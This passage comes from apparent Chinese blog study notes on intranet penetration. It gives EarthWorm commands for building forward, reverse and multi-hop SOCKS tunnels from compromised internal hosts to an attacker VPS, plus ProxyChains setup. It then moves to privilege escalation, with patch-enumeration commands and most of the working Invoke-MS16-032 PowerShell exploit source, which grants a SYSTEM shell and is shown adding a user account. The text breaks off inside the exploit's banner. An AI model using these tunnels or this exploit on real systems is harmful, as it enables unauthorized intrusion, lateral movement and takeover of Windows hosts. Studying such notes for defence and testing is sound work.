<li>禁止网络中的任何人想外网发送DNS请求，只允许与信任的DNS服务器发送请求</li>
<li>除了邮件服务器和网关没有人会将TXT请求发送给DNS服务器。因此可以将邮件服务器和网关列入白名单，然后阻止传入流量和传出流量中的TXT请求。</li>
<li>设置用户的DNS查询次数。如果超过标准，生成对应的报告提醒。</li>
<li>阻止ICMP</li>
</ul>
<h2 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h2><p>常用的内网场景</p>
<ul>
<li>服务器在内网中，可以访问任意外部网络</li>
<li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙拒绝敏感端口连接</li>
<li>服务器在内网中，不可以访问外部网络，对外只开放了部分端口(如80端口)</li>
</ul>
<h3 id="常用SOCKS工具"><a href="#常用SOCKS工具" class="headerlink" title="常用SOCKS工具"></a>常用SOCKS工具</h3><p>SOCKS分为SOCKS4和SOCK5两种。SOCKS4只支持TCP协议。SOCKS5支持TCP/UDP协议，还支持各种身份验证机制，标准端口为1080.</p>
<p>SOCKS代理相当于加强版的lcx。它在服务端监听一个端口，如果有新的连接出现。会从SOCKS协议中解析出目标URL，再执行lcx具体的功能。</p>
<p>SOCKS代理最好使用命令行工具，并且最好选择不需要依赖的SOCKS代理。</p>
<ol>
<li>EarthWorm</li>
</ol>
<p>EW可以执行SOCKS 5服务和端口转发。可以以正向反向，多级级联的方式建立SOCKS隧道。EW工具包也提供的多个可执行文件适用于不同的操作系统(Linux ,Windows , Mac, ARM-Linux )</p>
<ol start="2">
<li><p>reGeorg</p>
</li>
<li><p>sSocks</p>
</li>
<li><p>SocksCap64</p>
</li>
</ol>
<p>SocksCap6是一个在Win环境中适合的全局代理工具。</p>
<p>SocksCap64可以使Windows程序通过SOCKS 代理服务访问网络，而不需要对程序进行修改。即使是那些本身也不支持SOCKS的程序，也可以通过SocksCap64实现代理访问。</p>
<ol start="5">
<li><p>Proxifier</p>
</li>
<li><p>ProxyChains</p>
</li>
</ol>
<h3 id="SOCKS代理技术在网络环境中的运用"><a href="#SOCKS代理技术在网络环境中的运用" class="headerlink" title="SOCKS代理技术在网络环境中的运用"></a>SOCKS代理技术在网络环境中的运用</h3><h4 id="EW的使用"><a href="#EW的使用" class="headerlink" title="EW的使用"></a>EW的使用</h4><p>EW的使用也非常简单，有六种命令格式分别是 ssocksd , rcsocks , rssocks , lcx_slave, lcx_listen, lcx_tran.其中用于普通网络环境的正向连接命令是 ssocksd, 用于反弹连接的命令是rcsocks, rssocks.</p>
<ol>
<li>正向连接SOCKS 5 服务器</li>
</ol>
<p>适用与目标服务器拥有一个外网IP地址。</p>
<p><code>ew -s ssocksd -l 888</code></p>
<p>在服务器上建立一个端口为888的SOCKS代理。</p>
<ol start="2">
<li>反弹SOCKS 5 服务器</li>
</ol>
<p>在目标服务器没有公网IP的情况下使用</p>
<p>首先在VPS上使用如下命令<br><code>ew -s rcsocks -l 1008 -e 888</code></p>
<p>在VPS上将1008端口收到的流量转发的888端口</p>
<p>然后在内网服务器上运行如下命令</p>
<p><code>ew -s rssocks -d 192.168.1.5 -e 888 </code></p>
<p>表示在内网服务器上启动SOCKS5 服务，反弹到VPS的888端口</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504152119.png"></p>
<p>这个时候访问VPS的1008端口，就可以使用内网中的SOCKS 5代理服务。</p>
<ol start="3">
<li>二级网络环境A</li>
</ol>
<p>假设在内网中有控制两个主机A和B.<br>A有公网IP只能访问内网主机B。<br>主机B无法访问外网，但是可以访问内网资源。</p>
<p>首先在B主机上使用ssocksd方法启动 888端口的SOCKS代理</p>
<p><code>ew -s ssocksd -l 888</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504154037.png"></p>
<p>然后在A主机使用命令</p>
<p><code>ew -s lcx_tran -l 1080 -f 192.168.1.1 -g 888</code></p>
<p>将1080端口收到的 代理转发请求给B主机的10.48.128.49 的 888 端口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504154210.png"></p>
<p>现在可以访问A主机的1080端口使用在B主机上的SOCKS5代理</p>
<ol start="4">
<li>二级网络B</li>
</ol>
<p>与二级网络A相似但是。A主机没有公网IP</p>
<p>首先在VPS上使用一下命令<br><code>ew -s lcs_listen -l 10800 -e 888</code></p>
<p>将10800收到的代理请求转发到888端口</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504154759.png"></p>
<p>在B主机使用一下命令</p>
<p><code>ew -s ssocksd -l 999</code></p>
<p>在999端口启动SOCKS5服务<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504154918.png"></p>
<p>然后在跳板机A使用命令</p>
<p><code>ew -s lcx_slave -d 192.168.1.5 -e 888 -f 192.168.1.1 -g 999</code></p>
<p>在 A主机上使用lcx_slave方式，将VPS的888端口和B主机的999端口连接起来</p>
<p>返回VPS页面可以发现成功连接<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220504155152.png"></p>
<ol start="5">
<li>三级网络环境</li>
</ol>
<ul>
<li>A主机没有公网IP,可以访问B主机</li>
<li>B主机可以访问C主机</li>
<li>C主机可以访问核心区域</li>
</ul>
<p>在VPS执行如下命令，将1080端口请求转发到888端口</p>
<p><code>ew -s rcsocks -l 1080 -e 888</code></p>
<p>在A主机执行如下命令，将VPS的888端口和B主机的999端口连接</p>
<p><code>ew -s lcx_slave -d 192.168.1.5 -e 888 -f 192.168.1.2 -g 999</code></p>
<p>在B主机执行命令,将999端口收到请求转发给777端口</p>
<p><code>ew -s lcx_listen -l 999 -e 777 </code></p>
<p>在C主机上启动SOCKS 5服务，并反弹到B主机的777端口上<br><code>ew -s rssocks -d 192.168.1.2 -e 777 </code></p>
<p>接着可以访问VPS(192.168.1.5)的 1080端口 访问C主机的SOCKS 5代理服务</p>
<h4 id="Win中使用SocksCap64实现内网漫游"><a href="#Win中使用SocksCap64实现内网漫游" class="headerlink" title="Win中使用SocksCap64实现内网漫游"></a>Win中使用SocksCap64实现内网漫游</h4><p>在SocksCap中添加代理。测试可以正常运行后即可使用</p>
<h4 id="在Linux下使用-ProxyChains-实现内网漫游"><a href="#在Linux下使用-ProxyChains-实现内网漫游" class="headerlink" title="在Linux下使用 ProxyChains 实现内网漫游"></a>在Linux下使用 ProxyChains 实现内网漫游</h4><p>在conf文件中删除 “Dynamic_chain”前的”#””。在来到窗口底部将”127.0.0.1 9050”修改为想要访问的端口信息</p>
<p>可以在使用 /usr/lib/proxychains3/proxyersolv  检查代理是否成功运行</p>
<p><code>proxyresolv www.baidu.com</code></p>
<p>使用<br><code>proxychains firefox</code></p>
<h2 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a>上传和下载</h2>]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>内网安全攻防笔记4</title>
    <url>/2022/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B04/</url>
    <content><![CDATA[<h1 id="内网攻防笔记4-提权"><a href="#内网攻防笔记4-提权" class="headerlink" title="内网攻防笔记4-提权"></a>内网攻防笔记4-提权</h1><h2 id="系统内核溢出提权"><a href="#系统内核溢出提权" class="headerlink" title="系统内核溢出提权"></a>系统内核溢出提权</h2><p>通过笔记系统安装的补丁与对应的漏洞补丁编号进行对比，找出没有打补丁的洞。直接上Exp提权。</p>
<h3 id="手动发现缺少补丁"><a href="#手动发现缺少补丁" class="headerlink" title="手动发现缺少补丁"></a>手动发现缺少补丁</h3><p><code>systeminfo</code></p>
<span id="more"></span>
<p>查看系统相关信息。<br>也可以使用wmic命令查看补丁<br><code>wmic qfe get Caption , Description , HotFixId, InstalledOn</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220512105419.png"></p>
<p>通过比较Exp编号和补丁编号，查找出没有打补丁的漏洞。</p>
<p>执行一下命令对补丁进行过滤<br><code>wmic qfe get Caption , Description , HotFixId, InstalledOn | findstr /C:&quot;KB3143141&quot; /C:&quot;KB976902&quot;</code></p>
<p>如果目标机器存在MS16-032(KB3139914)漏洞，可以使用Invoke_MS16-032.ps1提权。通过该脚本可以实现执行任意程序</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-MS16-032</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    PowerShell implementation of MS16-032. The exploit targets all vulnerable</span></span><br><span class="line"><span class="comment">    operating systems that support PowerShell v2+. Credit for the discovery of</span></span><br><span class="line"><span class="comment">    the bug and the logic to exploit it go to James Forshaw (@tiraniddo).</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Targets:</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    * Win7-Win10 &amp; 2k8-2k12 &lt;== 32/64 bit!</span></span><br><span class="line"><span class="comment">    * Tested on x32 Win7, x64 Win8, x64 2k12R2</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Notes:</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    * In order for the race condition to succeed the machine must have 2+ CPU</span></span><br><span class="line"><span class="comment">      cores. If testing in a VM just make sure to add a core if needed mkay.</span></span><br><span class="line"><span class="comment">    * The exploit is pretty reliable, however ~1/6 times it will say it succeeded</span></span><br><span class="line"><span class="comment">      but not spawn a shell. Not sure what the issue is but just re-run and profit!</span></span><br><span class="line"><span class="comment">    * Want to know more about MS16-032 ==&gt;</span></span><br><span class="line"><span class="comment">      https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">    Author: Ruben Boonen (@FuzzySec)</span></span><br><span class="line"><span class="comment">    Blog: http://www.fuzzysecurity.com/</span></span><br><span class="line"><span class="comment">    License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">    Required Dependencies: PowerShell v2+</span></span><br><span class="line"><span class="comment">    Optional Dependencies: None</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Application</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Specifies an Application to run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Commandline</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Specifies Commandline, such as net user xxx xxx /add</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">    C:\PS&gt; Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe</span></span><br><span class="line"><span class="comment">    C:\PS&gt; Invoke-MS16-032 -Application C:\Windows\System32\cmd.exe -Commandline &quot;/c net user 1 1 /add&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">  <span class="function">[<span class="type">CmdletBinding</span>()]</span></span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span> = <span class="variable">$False</span>, <span class="type">ParameterSetName</span> = <span class="string">&#x27;C:\Windows\System32\cmd.exe&#x27;</span> )]</span><br><span class="line">        [<span class="built_in">string</span>]</span><br><span class="line">        <span class="variable">$Application</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span> = <span class="variable">$False</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]</span><br><span class="line">        <span class="variable">$Commandline</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="string">@&quot;</span></span><br><span class="line"><span class="string">    using System;</span></span><br><span class="line"><span class="string">    using System.Diagnostics;</span></span><br><span class="line"><span class="string">    using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">    using System.Security.Principal;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">    public struct PROCESS_INFORMATION</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        public IntPtr hProcess;</span></span><br><span class="line"><span class="string">        public IntPtr hThread;</span></span><br><span class="line"><span class="string">        public int dwProcessId;</span></span><br><span class="line"><span class="string">        public int dwThreadId;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]</span></span><br><span class="line"><span class="string">    public struct STARTUPINFO</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        public Int32 cb;</span></span><br><span class="line"><span class="string">        public string lpReserved;</span></span><br><span class="line"><span class="string">        public string lpDesktop;</span></span><br><span class="line"><span class="string">        public string lpTitle;</span></span><br><span class="line"><span class="string">        public Int32 dwX;</span></span><br><span class="line"><span class="string">        public Int32 dwY;</span></span><br><span class="line"><span class="string">        public Int32 dwXSize;</span></span><br><span class="line"><span class="string">        public Int32 dwYSize;</span></span><br><span class="line"><span class="string">        public Int32 dwXCountChars;</span></span><br><span class="line"><span class="string">        public Int32 dwYCountChars;</span></span><br><span class="line"><span class="string">        public Int32 dwFillAttribute;</span></span><br><span class="line"><span class="string">        public Int32 dwFlags;</span></span><br><span class="line"><span class="string">        public Int16 wShowWindow;</span></span><br><span class="line"><span class="string">        public Int16 cbReserved2;</span></span><br><span class="line"><span class="string">        public IntPtr lpReserved2;</span></span><br><span class="line"><span class="string">        public IntPtr hStdInput;</span></span><br><span class="line"><span class="string">        public IntPtr hStdOutput;</span></span><br><span class="line"><span class="string">        public IntPtr hStdError;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">    public struct SQOS</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        public int Length;</span></span><br><span class="line"><span class="string">        public int ImpersonationLevel;</span></span><br><span class="line"><span class="string">        public int ContextTrackingMode;</span></span><br><span class="line"><span class="string">        public bool EffectiveOnly;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public static class Advapi32</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true, CharSet=CharSet.Unicode)]</span></span><br><span class="line"><span class="string">        public static extern bool CreateProcessWithLogonW(</span></span><br><span class="line"><span class="string">            String userName,</span></span><br><span class="line"><span class="string">            String domain,</span></span><br><span class="line"><span class="string">            String password,</span></span><br><span class="line"><span class="string">            int logonFlags,</span></span><br><span class="line"><span class="string">            String applicationName,</span></span><br><span class="line"><span class="string">            String commandLine,</span></span><br><span class="line"><span class="string">            int creationFlags,</span></span><br><span class="line"><span class="string">            int environment,</span></span><br><span class="line"><span class="string">            String currentDirectory,</span></span><br><span class="line"><span class="string">            ref  STARTUPINFO startupInfo,</span></span><br><span class="line"><span class="string">            out PROCESS_INFORMATION processInformation);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool SetThreadToken(</span></span><br><span class="line"><span class="string">            ref IntPtr Thread,</span></span><br><span class="line"><span class="string">            IntPtr Token);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool OpenThreadToken(</span></span><br><span class="line"><span class="string">            IntPtr ThreadHandle,</span></span><br><span class="line"><span class="string">            int DesiredAccess,</span></span><br><span class="line"><span class="string">            bool OpenAsSelf,</span></span><br><span class="line"><span class="string">            out IntPtr TokenHandle);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool OpenProcessToken(</span></span><br><span class="line"><span class="string">            IntPtr ProcessHandle, </span></span><br><span class="line"><span class="string">            int DesiredAccess,</span></span><br><span class="line"><span class="string">            ref IntPtr TokenHandle);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public extern static bool DuplicateToken(</span></span><br><span class="line"><span class="string">            IntPtr ExistingTokenHandle,</span></span><br><span class="line"><span class="string">            int SECURITY_IMPERSONATION_LEVEL,</span></span><br><span class="line"><span class="string">            ref IntPtr DuplicateTokenHandle);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public static class Kernel32</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;)]</span></span><br><span class="line"><span class="string">        public static extern uint GetLastError();</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern IntPtr GetCurrentProcess();</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern IntPtr GetCurrentThread();</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern int GetThreadId(IntPtr hThread);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span></span><br><span class="line"><span class="string">        public static extern int GetProcessIdOfThread(IntPtr handle);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;,SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern int SuspendThread(IntPtr hThread);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;,SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern int ResumeThread(IntPtr hThread);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool TerminateProcess(</span></span><br><span class="line"><span class="string">            IntPtr hProcess,</span></span><br><span class="line"><span class="string">            uint uExitCode);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool CloseHandle(IntPtr hObject);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern bool DuplicateHandle(</span></span><br><span class="line"><span class="string">            IntPtr hSourceProcessHandle,</span></span><br><span class="line"><span class="string">            IntPtr hSourceHandle,</span></span><br><span class="line"><span class="string">            IntPtr hTargetProcessHandle,</span></span><br><span class="line"><span class="string">            ref IntPtr lpTargetHandle,</span></span><br><span class="line"><span class="string">            int dwDesiredAccess,</span></span><br><span class="line"><span class="string">            bool bInheritHandle,</span></span><br><span class="line"><span class="string">            int dwOptions);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public static class Ntdll</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        [DllImport(&quot;ntdll.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern int NtImpersonateThread(</span></span><br><span class="line"><span class="string">            IntPtr ThreadHandle,</span></span><br><span class="line"><span class="string">            IntPtr ThreadToImpersonate,</span></span><br><span class="line"><span class="string">            ref SQOS SecurityQualityOfService);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-ThreadHandle</span></span> &#123;</span><br><span class="line">        <span class="comment"># StartupInfo Struct</span></span><br><span class="line">        <span class="variable">$StartupInfo</span> = <span class="built_in">New-Object</span> STARTUPINFO</span><br><span class="line">        <span class="variable">$StartupInfo</span>.dwFlags = <span class="number">0</span>x00000101 <span class="comment"># STARTF_USESTDHANDLES</span></span><br><span class="line">            <span class="variable">$StartupInfo</span>.wShowWindow = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$StartupInfo</span>.hStdInput = [<span class="type">Kernel32</span>]::GetCurrentThread()</span><br><span class="line">        <span class="variable">$StartupInfo</span>.hStdOutput = [<span class="type">Kernel32</span>]::GetCurrentThread()</span><br><span class="line">        <span class="variable">$StartupInfo</span>.hStdError = [<span class="type">Kernel32</span>]::GetCurrentThread()</span><br><span class="line">        <span class="variable">$StartupInfo</span>.cb = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$StartupInfo</span>) <span class="comment"># Struct Size</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ProcessInfo Struct</span></span><br><span class="line">        <span class="variable">$ProcessInfo</span> = <span class="built_in">New-Object</span> PROCESS_INFORMATION</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># CreateProcessWithLogonW --&gt; lpCurrentDirectory</span></span><br><span class="line">        <span class="variable">$GetCurrentPath</span> = (<span class="built_in">Get-Item</span> <span class="literal">-Path</span> <span class="string">&quot;.\&quot;</span> <span class="literal">-Verbose</span>).FullName</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::CreateProcessWithLogonW(</span><br><span class="line">            <span class="string">&quot;user&quot;</span>, <span class="string">&quot;domain&quot;</span>, <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">            <span class="number">0</span>x00000002, <span class="string">&quot;C:\Windows\System32\notepad.exe&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="number">0</span>x00000004, <span class="variable">$null</span>, <span class="variable">$GetCurrentPath</span>,</span><br><span class="line">            [<span class="type">ref</span>]<span class="variable">$StartupInfo</span>, [<span class="type">ref</span>]<span class="variable">$ProcessInfo</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Duplicate handle into current process -&gt; DUPLICATE_SAME_ACCESS</span></span><br><span class="line">        <span class="variable">$lpTargetHandle</span> = [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::DuplicateHandle(</span><br><span class="line">            <span class="variable">$ProcessInfo</span>.hProcess, <span class="number">0</span>x4,</span><br><span class="line">            [<span class="type">Kernel32</span>]::GetCurrentProcess(),</span><br><span class="line">            [<span class="type">ref</span>]<span class="variable">$lpTargetHandle</span>, <span class="number">0</span>, <span class="variable">$false</span>,</span><br><span class="line">            <span class="number">0</span>x00000002)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Clean up suspended process</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::TerminateProcess(<span class="variable">$ProcessInfo</span>.hProcess, <span class="number">1</span>)</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::CloseHandle(<span class="variable">$ProcessInfo</span>.hProcess)</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::CloseHandle(<span class="variable">$ProcessInfo</span>.hThread)</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$lpTargetHandle</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-SystemToken</span></span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;`n[?] Trying thread handle: <span class="variable">$Thread</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[?] Thread belongs to: <span class="variable">$</span>(<span class="variable">$</span>(Get-Process -PID <span class="variable">$</span>([Kernel32]::GetProcessIdOfThread(<span class="variable">$Thread</span>))).ProcessName)&quot;</span></span><br><span class="line">    </span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::SuspendThread(<span class="variable">$Thread</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$CallResult</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] <span class="variable">$Thread</span> is a bad thread, moving on..&quot;</span></span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125; <span class="built_in">echo</span> <span class="string">&quot;[+] Thread suspended&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Wiping current impersonation token&quot;</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::SetThreadToken([<span class="type">ref</span>]<span class="variable">$Thread</span>, [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$CallResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] SetThreadToken failed, moving on..&quot;</span></span><br><span class="line">            <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::ResumeThread(<span class="variable">$Thread</span>)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[+] Thread resumed!&quot;</span></span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Building SYSTEM impersonation token&quot;</span></span><br><span class="line">        <span class="comment"># SecurityQualityOfService struct</span></span><br><span class="line">        <span class="variable">$SQOS</span> = <span class="built_in">New-Object</span> SQOS</span><br><span class="line">        <span class="variable">$SQOS</span>.ImpersonationLevel = <span class="number">2</span> <span class="comment">#SecurityImpersonation</span></span><br><span class="line">        <span class="variable">$SQOS</span>.Length = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$SQOS</span>)</span><br><span class="line">        <span class="comment"># Undocumented API&#x27;s, I like your style Microsoft ;)</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Ntdll</span>]::NtImpersonateThread(<span class="variable">$Thread</span>, <span class="variable">$Thread</span>, [<span class="type">ref</span>]<span class="variable">$sqos</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$CallResult</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] NtImpersonateThread failed, moving on..&quot;</span></span><br><span class="line">            <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::ResumeThread(<span class="variable">$Thread</span>)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[+] Thread resumed!&quot;</span></span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$script:SysTokenHandle</span> = [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero</span><br><span class="line">        <span class="comment"># 0x0006 --&gt; TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::OpenThreadToken(<span class="variable">$Thread</span>, <span class="number">0</span>x0006, <span class="variable">$false</span>, [<span class="type">ref</span>]<span class="variable">$SysTokenHandle</span>)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$CallResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] OpenThreadToken failed, moving on..&quot;</span></span><br><span class="line">            <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::ResumeThread(<span class="variable">$Thread</span>)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[+] Thread resumed!&quot;</span></span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[?] Success, open SYSTEM token handle: <span class="variable">$SysTokenHandle</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[+] Resuming thread..&quot;</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::ResumeThread(<span class="variable">$Thread</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># main() &lt;--- ;)</span></span><br><span class="line">    <span class="variable">$ms16032</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">     __ __ ___ ___   ___     ___ ___ ___ </span></span><br><span class="line"><span class="string">    |  V  |  _|_  | |  _|___|   |_  |_  |</span></span><br><span class="line"><span class="string">    |     |_  |_| |_| 